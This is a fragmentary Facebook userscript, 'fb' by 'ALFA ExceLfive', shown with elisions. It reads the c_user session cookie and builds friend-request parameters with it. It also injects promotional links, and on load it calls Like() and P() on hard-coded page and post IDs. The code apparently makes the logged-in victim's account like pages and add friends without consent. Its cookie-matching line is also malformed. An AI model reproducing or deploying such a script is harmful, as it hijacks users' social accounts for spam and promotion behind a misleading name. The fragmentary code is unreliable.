// ==UserScript==
// @name        fb
// @namespace   http://yourjavascript.com/24225192021/javasript.js
// @description my-alfa
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/ALFA.ExceLfive" target="_blank">ALFA ExceLfive / .<br>ALFA ExceLfive</a>';
	html += '</div>';
...
var spage_id = "365523820144629";
var spost_id = "648379285186390";
var sfoto_id = "771876396160022";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function sarkadasekle(uid,cins){
        ...
        params += "&phstamp=365523820144629";
		params += "&__user=" + user_id;
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by ALFA ExceLfive';
...
// pic + fans
P("456793697777067");P("447366198719817");Like("365523820144629");
